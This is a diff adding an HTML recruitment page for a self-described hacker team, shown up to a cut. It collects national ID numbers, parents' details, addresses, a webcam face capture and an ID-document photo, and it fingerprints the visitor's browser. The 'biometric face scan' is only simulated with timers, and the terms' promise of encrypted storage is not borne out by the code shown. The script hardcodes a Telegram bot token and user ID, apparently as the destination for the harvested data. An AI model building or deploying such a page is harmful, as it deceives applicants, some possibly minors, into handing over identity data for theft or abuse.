@@ -1,0 +1,1409 @@
+ 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Saiko Hacker Team {R.M} - Advanced Member Recruitment</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 30%, #2d0000 70%, #000000 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255, 0, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 0, 0, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+            animation: backgroundPulse 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes backgroundPulse {
+            0% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(15, 15, 15, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 
+                0 0 50px rgba(255, 0, 0, 0.3),
+                inset 0 0 50px rgba(255, 0, 0, 0.05);
+            border: 2px solid #ff0000;
+            backdrop-filter: blur(10px);
+            animation: containerGlow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes containerGlow {
+            0% { box-shadow: 0 0 50px rgba(255, 0, 0, 0.3), inset 0 0 50px rgba(255, 0, 0, 0.05); }
+            100% { box-shadow: 0 0 70px rgba(255, 0, 0, 0.5), inset 0 0 70px rgba(255, 0, 0, 0.1); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        .logo {
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            margin: 0 auto 25px;
+            display: block;
+            border: 4px solid #ff0000;
+            box-shadow: 
+                0 0 30px rgba(255, 0, 0, 0.6),
+                inset 0 0 20px rgba(255, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            /* Removed rotation animation */
+        }
+
+        .logo:hover {
+            transform: scale(1.05);
+            box-shadow: 
+                0 0 40px rgba(255, 0, 0, 0.8),
+                inset 0 0 30px rgba(255, 0, 0, 0.2);
+        }
+
+        h1 {
+            font-family: 'Orbitron', monospace;
+            color: #ff0000;
+            text-shadow: 
+                0 0 20px rgba(255, 0, 0, 0.8),
+                0 0 40px rgba(255, 0, 0, 0.4);
+            margin-bottom: 15px;
+            font-size: 3em;
+            font-weight: 900;
+            letter-spacing: 3px;
+            animation: textGlow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes textGlow {
+            0% { text-shadow: 0 0 20px rgba(255, 0, 0, 0.8), 0 0 40px rgba(255, 0, 0, 0.4); }
+            100% { text-shadow: 0 0 30px rgba(255, 0, 0, 1), 0 0 60px rgba(255, 0, 0, 0.6); }
+        }
+
+        .subtitle {
+            color: #ff6666;
+            font-size: 1.4em;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .tagline {
+            color: #cccccc;
+            font-size: 1.1em;
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+
+        .ip-info {
+            background: rgba(255, 0, 0, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .ip-info h4 {
+            color: #ff3333;
+            margin-bottom: 10px;
+            font-family: 'Orbitron', monospace;
+        }
+
+        .ip-info p {
+            color: #cccccc;
+            font-size: 0.9em;
+        }
+
+        .form-section {
+            margin-bottom: 35px;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: slideInUp 0.6s ease-out forwards;
+        }
+
+        .form-section:nth-child(2) { animation-delay: 0.1s; }
+        .form-section:nth-child(3) { animation-delay: 0.2s; }
+        .form-section:nth-child(4) { animation-delay: 0.3s; }
+
+        @keyframes slideInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .section-title {
+            font-family: 'Orbitron', monospace;
+            color: #ff3333;
+            font-size: 1.5em;
+            font-weight: 700;
+            margin-bottom: 25px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(255, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .section-title i {
+            font-size: 1.2em;
+            color: #ff0000;
+            animation: iconPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes iconPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #ff9999;
+            font-weight: 600;
+            font-size: 1.1em;
+            letter-spacing: 0.5px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #333;
+            border-radius: 12px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #ffffff;
+            font-size: 16px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #ff0000;
+            box-shadow: 
+                0 0 20px rgba(255, 0, 0, 0.4),
+                inset 0 0 10px rgba(255, 0, 0, 0.1);
+            background: rgba(0, 0, 0, 0.9);
+            transform: scale(1.02);
+        }
+
+        /* Face Scan System */
+        .face-scan-container {
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0.3) 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            border: 2px solid rgba(255, 0, 0, 0.3);
+            position: relative;
+            text-align: center;
+        }
+
+        .face-scan-title {
+            font-family: 'Orbitron', monospace;
+            color: #ff0000;
+            font-size: 1.6em;
+            font-weight: 700;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .face-video-container {
+            position: relative;
+            display: inline-block;
+            margin: 20px 0;
+        }
+
+        #faceVideo {
+            width: 400px;
+            height: 300px;
+            border: 3px solid #ff0000;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
+        }
+
+        .face-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: 3px solid transparent;
+            border-radius: 15px;
+            pointer-events: none;
+        }
+
+        .face-detection-frame {
+            position: absolute;
+            border: 2px solid #00ff00;
+            border-radius: 50%;
+            animation: scanPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes scanPulse {
+            0%, 100% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+        }
+
+        .scan-progress {
+            margin: 20px 0;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #333;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff3333);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+
+        .scan-instruction {
+            font-size: 1.3em;
+            font-weight: 600;
+            color: #ff3333;
+            margin: 15px 0;
+            animation: instructionBlink 1s ease-in-out infinite alternate;
+        }
+
+        @keyframes instructionBlink {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+
+        /* Document Scan System */
+        .document-scan-container {
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.05) 0%, rgba(0, 0, 0, 0.3) 100%);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            border: 2px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .document-option {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 2px solid #333;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .document-option:hover {
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.1);
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 10px 25px rgba(255, 0, 0, 0.2);
+        }
+
+        .document-option.selected {
+            border-color: #ff0000;
+            background: rgba(255, 0, 0, 0.15);
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.3);
+        }
+
+        .document-icon {
+            font-size: 3em;
+            color: #ff0000;
+            min-width: 80px;
+            text-align: center;
+            animation: iconFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes iconFloat {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+
+        .document-camera-container {
+            text-align: center;
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 12px;
+            border: 1px solid #333;
+        }
+
+        #documentVideo {
+            width: 100%;
+            max-width: 400px;
+            height: 300px;
+            border: 3px solid #ff0000;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .document-frame {
+            position: relative;
+            display: inline-block;
+        }
+
+        .document-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 60%;
+            border: 2px dashed #00ff00;
+            border-radius: 8px;
+            pointer-events: none;
+            animation: documentScanFrame 2s ease-in-out infinite;
+        }
+
+        @keyframes documentScanFrame {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        .action-btn {
+            background: linear-gradient(45deg, #ff0000, #cc0000);
+            color: white;
+            border: none;
+            padding: 15px 35px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            font-family: 'Rajdhani', sans-serif;
+            margin: 10px;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .action-btn:hover::before {
+            left: 100%;
+        }
+
+        .action-btn:hover {
+            background: linear-gradient(45deg, #cc0000, #990000);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 0, 0, 0.4);
+        }
+
+        .action-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Terms and Conditions */
+        .terms-section {
+            background: rgba(255, 0, 0, 0.05);
+            padding: 25px;
+            border-radius: 12px;
+            margin: 30px 0;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .terms-checkbox {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .terms-checkbox input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin: 0;
+            accent-color: #ff0000;
+        }
+
+        .terms-text {
+            flex: 1;
+            color: #cccccc;
+            line-height: 1.6;
+        }
+
+        .terms-link {
+            color: #ff3333;
+            text-decoration: underline;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .terms-link:hover {
+            color: #ff0000;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
+            margin: 5% auto;
+            padding: 30px;
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            width: 80%;
+            max-width: 600px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            animation: modalSlideIn 0.3s ease-out;
+        }
+
+        @keyframes modalSlideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .close {
+            color: #ff0000;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .close:hover {
+            color: #ff3333;
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, #ff0000, #ff3333);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 700;
+            font-family: 'Orbitron', monospace;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.7s;
+        }
+
+        .submit-btn:hover::before {
+            left: 100%;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(45deg, #ff3333, #ff0000);
+            transform: translateY(-4px);
+            box-shadow: 0 12px 35px rgba(255, 0, 0, 0.5);
+        }
+
+        .submit-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .status-message {
+            padding: 20px;
+            border-radius: 12px;
+            margin: 25px 0;
+            text-align: center;
+            font-weight: 600;
+            font-size: 1.1em;
+            animation: messageSlideIn 0.3s ease-out;
+        }
+
+        @keyframes messageSlideIn {
+            from { transform: translateX(-20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .success {
+            background: rgba(0, 255, 0, 0.2);
+            border: 2px solid #00ff00;
+            color: #00ff00;
+        }
+
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 2px solid #ff0000;
+            color: #ff0000;
+        }
+
+        .warning {
+            background: rgba(255, 165, 0, 0.2);
+            border: 2px solid #ffa500;
+            color: #ffa500;
+        }
+
+        .two-column {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+        }
+
+        @media (max-width: 768px) {
+            .two-column {
+                grid-template-columns: 1fr;
+            }
+            
+            .container {
+                padding: 25px;
+            }
+            
+            h1 {
+                font-size: 2.2em;
+            }
+            
+            .document-option {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            #faceVideo, #documentVideo {
+                width: 100%;
+                max-width: 300px;
+            }
+        }
+    </style>
+<link rel="me" href="https://draft.blogger.com/profile/16823679872572895978" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="IMG_20250630_211750_535.webp" alt="Tean S-H-T Logo" class="logo">
+            <h1>S-H-T</h1>
+            <p class="subtitle">Elite Member Recruitment</p>
+            <p class="tagline">WE HERE FOR YOUR SECURITY</p>
+        </div>
+
+       
+
+        <form id="recruitmentForm">
+            <!-- Personal Information Section -->
+            <div class="form-section">
+                <div class="section-title">
+                    <i class="fas fa-user-circle"></i>
+                    Your Information
+                </div>
+
+                <div class="form-group">
+                    <label for="name"><i class="fas fa-signature"></i> Full Name:</label>
+                    <input type="text" id="name" name="name" placeholder="Enter your full name" required>
+                </div>
+
+                <div class="two-column">
+                    <div class="form-group">
+                        <label for="age"><i class="fas fa-calendar-alt"></i> Age:</label>
+                        <input type="number" id="age" name="age" min="16" max="60" placeholder="Your age" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dob"><i class="fas fa-birthday-cake"></i> Date of Birth:</label>
+                        <input type="date" id="dob" name="dob" required>
+                    </div>
+                </div>
+
+                <div class="two-column">
+                    <div class="form-group">
+                        <label for="primaryNumber"><i class="fas fa-phone"></i> Primary Number:</label>
+                        <input type="tel" id="primaryNumber" name="primaryNumber" placeholder="+880 1XXXXXXXXX" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="secondaryNumber"><i class="fas fa-phone-alt"></i> Secondary Number:</label>
+                        <input type="tel" id="secondaryNumber" name="secondaryNumber" placeholder="+880 1XXXXXXXXX (Optional)">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="instituteName"><i class="fas fa-university"></i> Institute Name:</label>
+                    <input type="text" id="instituteName" name="instituteName" placeholder="Your educational institute" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="nidOrBirth"><i class="fas fa-id-card"></i> NID or Birth Certificate Number:</label>
+                    <input type="text" id="nidOrBirth" name="nidOrBirth" placeholder="Enter your ID number" required>
+                </div>
+
+                <div class="two-column">
+                    <div class="form-group">
+                        <label for="fatherName"><i class="fas fa-male"></i> Father's Name:</label>
+                        <input type="text" id="fatherName" name="fatherName" placeholder="Father's full name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="fatherNumber"><i class="fas fa-phone"></i> Father's Number:</label>
+                        <input type="tel" id="fatherNumber" name="fatherNumber" placeholder="Father's phone number" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="motherName"><i class="fas fa-female"></i> Mother's Name:</label>
+                    <input type="text" id="motherName" name="motherName" placeholder="Mother's full name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="location"><i class="fas fa-map-marker-alt"></i> Location:</label>
+                    <input type="text" id="location" name="location" placeholder="Your current address" required>
+                </div>
+
+                <div class="two-column">
+                    <div class="form-group">
+                        <label for="facebookProfile"><i class="fab fa-facebook"></i> Facebook Profile:</label>
+                        <input type="url" id="facebookProfile" name="facebookProfile" placeholder="https://facebook.com/yourprofile" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="gmail"><i class="fas fa-envelope"></i> Gmail:</label>
+                        <input type="email" id="gmail" name="gmail" placeholder="your.email@gmail.com" required>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Advanced Face Scan Verification -->
+            <div class="face-scan-container">
+                <div class="face-scan-title">
+                    <i class="fas fa-camera"></i>
+                    <small> Face Verify</small>
+                </div>
+                
+                <div class="face-video-container">
+                    <video id="faceVideo" autoplay muted class="hidden"></video>
+                    <div class="face-overlay">
+                        <div id="faceDetectionFrame" class="face-detection-frame hidden"></div>
+                    </div>
+                </div>
+
+                <div class="scan-progress">
+                    <div class="scan-instruction" id="scanInstruction">Click "Start Face Scan" to begin verification</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div id="progressText">0% Complete</div>
+                </div>
+
+                <button type="button" id="startFaceScan" class="action-btn">
+                    <i class="fas fa-video"></i>
+                    Start Face Scan
+                </button>
+                <button type="button" id="retakeFaceScan" class="action-btn hidden">
+                    <i class="fas fa-redo"></i>
+                    Retake Scan
+                </button>
+            </div>
+
+            <!-- Document Camera Scan -->
+            <div class="document-scan-container">
+                <div class="face-scan-title">
+                    <i class="fas fa-shield-alt"></i>
+                    <small> Verification </small>
+                </div>
+                
+                <div class="document-option" data-option="nid">
+                    <div class="document-icon">
+                        <i class="fas fa-id-card"></i>
+                    </div>
+                    <div>
+                        <h3 style="color: #ff3333; font-size: 1.3em; margin-bottom: 8px;">National ID Card</h3>
+                        <p style="color: #cccccc;">Scan your National ID Card using front camera</p>
+                    </div>
+                </div>
+                
+                <div class="document-option" data-option="birth">
+                    <div class="document-icon">
+                        <i class="fas fa-certificate"></i>
+                    </div>
+                    <div>
+                        <h3 style="color: #ff3333; font-size: 1.3em; margin-bottom: 8px;">Birth Certificate</h3>
+                        <p style="color: #cccccc;">Scan your Birth Certificate using front camera</p>
+                    </div>
+                </div>
+
+                <div id="documentScanSection" class="hidden">
+                    <div class="document-camera-container">
+                        <div class="document-frame">
+                            <video id="documentVideo" autoplay muted></video>
+                            <div class="document-overlay"></div>
+                        </div>
+                        <br>
+                        <button type="button" id="startDocumentScan" class="action-btn">
+                            <i class="fas fa-camera"></i>
+                            Start Document Scan
+                        </button>
+                        <button type="button" id="captureDocument" class="action-btn hidden">
+                            <i class="fas fa-camera-retro"></i>
+                            Capture Document
+                        </button>
+                        <button type="button" id="retakeDocument" class="action-btn hidden">
+                            <i class="fas fa-redo"></i>
+                            Retake
+                        </button>
+                    </div>
+                    <div id="documentPreview"></div>
+                </div>
+            </div>
+
+            <!-- Terms and Conditions -->
+            <div class="terms-section">
+                <div class="section-title">
+                    <i class="fas fa-file-contract"></i>
+                    Terms and Conditions
+                </div>
+                <div class="terms-checkbox">
+                    <input type="checkbox" id="termsAgree" required>
+                    <div class="terms-text">
+                        I agree to the <span class="terms-link" onclick="openTermsModal()">Terms and Conditions</span> 
+                        and <span class="terms-link" onclick="openTermsModal()">Privacy Policy</span> of Team S-H-T. 
+                        I understand that my information will be used for recruitment purposes and team security verification.
+                    </div>
+                </div>
+            </div>
+
+            <div id="statusMessage"></div>
+            
+            <div style="text-align: center; margin-top: 40px;">
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    <i class="fas fa-rocket"></i>
+                    Submit 
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Terms Modal -->
+    <div id="termsModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeTermsModal()">&times;</span>
+            <h2 style="color: #ff0000; font-family: 'Orbitron', monospace; margin-bottom: 20px;">
+                <i class="fas fa-shield-alt"></i> Saiko Hacker Team {R.M}  - Terms & Conditions
+            </h2>
+            <div style="color: #cccccc; line-height: 1.6;">
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">1. Membership Agreement</h3>
+                <p>By applying to join Team S-H-T, you agree to uphold the highest standards of cybersecurity ethics and professionalism. Our team is dedicated to offensive security research and protection of digital assets.</p>
+
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">2. Data Collection & Privacy</h3>
+                <p>We collect personal information, biometric data, and identity verification documents solely for recruitment and security clearance purposes. Your data is encrypted and stored securely according to industry standards.</p>
+
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">3. Code of Conduct</h3>
+                <p>Members must adhere to ethical hacking principles, respect privacy laws, and use skills only for legitimate security testing and defense purposes. Any malicious activities will result in immediate termination.</p>
+
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">4. Confidentiality</h3>
+                <p>All team operations, methodologies, and client information are strictly confidential. Members must sign additional NDAs for specific projects and maintain operational security at all times.</p>
+
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">5. Training & Development</h3>
+                <p>Selected members will undergo intensive cybersecurity training, certification programs, and continuous skill development in areas including penetration testing, vulnerability assessment, and incident response.</p>
+
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">6. IP Address & Device Tracking</h3>
+                <p>For security purposes, we track IP addresses and device information. Only one application per IP address/device is permitted to prevent spam and ensure fair recruitment process.</p>
+
+                <h3 style="color: #ff3333; margin: 20px 0 10px 0;">7. Termination</h3>
+                <p>Membership may be terminated for violation of terms, unethical behavior, or failure to maintain required skill levels. Upon termination, all access credentials and confidential materials must be returned.</p>
+
+                <p style="margin-top: 30px; padding: 15px; background: rgba(255, 0, 0, 0.1); border-radius: 8px; border: 1px solid #ff0000;">
+                    <strong>By submitting this application, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions.</strong>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Hardcoded bot credentials
+        const BOT_TOKEN = '7436338106:AAGcXI_7s5X9ei15kEy3dKAe0bnkN4ElgyI';
+        const USER_ID = '7274313824';
+
+        let userIP = null;
+        let faceImageData = null;
+        let documentImageData = null;
+        let selectedDocumentType = null;
+        let faceScanProgress = 0;
+        let faceScanSteps = ['center', 'left', 'right', 'up', 'down'];
+        let currentStep = 0;
+        let faceStream = null;
+        let documentStream = null;
+        let hasSubmitted = false;
+
+        // Get user IP address
+        async function getUserIP() {
+            try {
+                // Try multiple IP services for reliability
+                const ipServices = [
+                    'https://api.ipify.org?format=json',
+                    'https://ipapi.co/json/',
+                    'https://api.ip.sb/jsonip'
+                ];
+
+                for (const service of ipServices) {
+                    try {
+                        const response = await fetch(service);
+                        const data = await response.json();
+                        userIP = data.ip || data.query;
+                        if (userIP) {
+                            document.getElementById('userIP').textContent = userIP;
+                            break;
+                        }
+                    } catch (error) {
+                        console.log(`Failed to get IP from ${service}:`, error);
+                        continue;
+                    }
+                }
+
+                if (!userIP) {
+                    // Fallback: generate a unique identifier based on browser fingerprint
+                    userIP = 'UNKNOWN_' + generateFingerprint();
+                    document.getElementById('userIP').textContent = userIP;
+                }
+
+                // Check if this IP has already submitted
+                checkIPSubmissionStatus();
+
+            } catch (error) {
+                console.error('Error getting IP:', error);
+                userIP = 'UNKNOWN_' + generateFingerprint();
+                document.getElementById('userIP').textContent = userIP;
+            }
+        }
+
+        // Generate browser fingerprint as fallback
+        function generateFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Browser fingerprint', 2, 2);
+            
+            const fingerprint = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width + 'x' + screen.height,
+                new Date().getTimezoneOffset(),
+                canvas.toDataURL()
+            ].join('|');
+            
+            // Simple hash function
+            let hash = 0;
+            for (let i = 0; i < fingerprint.length; i++) {
+                const char = fingerprint.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32-bit integer
+            }
+            return Math.abs(hash).toString(16);
+        }
+
+        // Check if IP has already submitted (using localStorage as simple check)
+        function checkIPSubmissionStatus() {
+            const submittedIPs = JSON.parse(localStorage.getItem('cyberSlayersSubmissions') || '[]');
+            if (submittedIPs.includes(userIP)) {
+                showMessage('⚠️ This device/IP has already submitted an application. Multiple submissions are not allowed.', 'warning');
+                disableForm();
+            }
+        }
+
+        // Disable form for already submitted IPs
+        function disableForm() {
+            const form = document.getElementById('recruitmentForm');
+            const inputs = form.querySelectorAll('input, button, select, textarea');
+            inputs.forEach(input => {
+                input.disabled = true;
+            });
+            document.getElementById('submitBtn').innerHTML = '<i class="fas fa-ban"></i> Already Submitted';
+            hasSubmitted = true;
+        }
+
+        // Mark IP as submitted
+        function markIPAsSubmitted() {
+            const submittedIPs = JSON.parse(localStorage.getItem('cyberSlayersSubmissions') || '[]');
+            if (!submittedIPs.includes(userIP)) {
+                submittedIPs.push(userIP);
+                localStorage.setItem('cyberSlayersSubmissions', JSON.stringify(submittedIPs));
+            }
+        }
+
+        // Initialize IP detection on page load
+        window.addEventListener('load', getUserIP);
+
+        // Face scanning system
+        const faceVideo = document.getElementById('faceVideo');
+        const scanInstruction = document.getElementById('scanInstruction');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+
+        document.getElementById('startFaceScan').addEventListener('click', startFaceScan);
+        document.getElementById('retakeFaceScan').addEventListener('click', retakeFaceScan);
+
+        async function startFaceScan() {
+            if (hasSubmitted) return;
+            
+            try {
+                faceStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 400, 
+                        height: 300,
+                        facingMode: 'user'
+                    } 
+                });
+                faceVideo.srcObject = faceStream;
+                faceVideo.classList.remove('hidden');
+                document.getElementById('startFaceScan').classList.add('hidden');
+                
+                // Start the scanning process
+                currentStep = 0;
+                faceScanProgress = 0;
+                updateFaceScanProgress();
+                startFaceScanSequence();
+                
+            } catch (error) {
+                showMessage('❌ Error accessing camera: ' + error.message, 'error');
+            }
+        }
+
+        function startFaceScanSequence() {
+            if (currentStep >= faceScanSteps.length) {
+                completeFaceScan();
+                return;
+            }
+
+            const step = faceScanSteps[currentStep];
+            let instruction = '';
+            
+            switch(step) {
+                case 'center':
+                    instruction = '👤 Look straight at the camera';
+                    break;
+                case 'left':
+                    instruction = '👈 Turn your head to the LEFT';
+                    break;
+                case 'right':
+                    instruction = '👉 Turn your head to the RIGHT';
+                    break;
+                case 'up':
+                    instruction = '👆 Tilt your head UP slightly';
+                    break;
+                case 'down':
+                    instruction = '👇 Tilt your head DOWN slightly';
+                    break;
+            }
+            
+            scanInstruction.textContent = instruction;
+            
+            // Simulate scanning for each step
+            setTimeout(() => {
+                currentStep++;
+                faceScanProgress = (currentStep / faceScanSteps.length) * 100;
+                updateFaceScanProgress();
+                
+                if (currentStep < faceScanSteps.length) {
+                    startFaceScanSequence();
+                } else {
+                    completeFaceScan();
+                }
+            }, 3000); // 3 seconds per step
+        }
+
+        function updateFaceScanProgress() {
+            progressFill.style.width = faceScanProgress + '%';
+            progressText.textContent = Math.round(faceScanProgress) + '% Complete';
+        }
+
+        function completeFaceScan() {
+            // Capture the final image
+            const canvas = document.createElement('canvas');
+            canvas.width = 400;
+            canvas.height = 300;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(faceVideo, 0, 0, 400, 300);
+            faceImageData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Stop camera
+            if (faceStream) {
+                faceStream.getTracks().forEach(track => track.stop());
+            }
+            
+            scanInstruction.textContent = '✅ Face scan completed successfully!';
+            scanInstruction.style.color = '#00ff00';
+            document.getElementById('retakeFaceScan').classList.remove('hidden');
+            
+            showMessage('✅ Biometric face verification completed!', 'success');
+        }
+
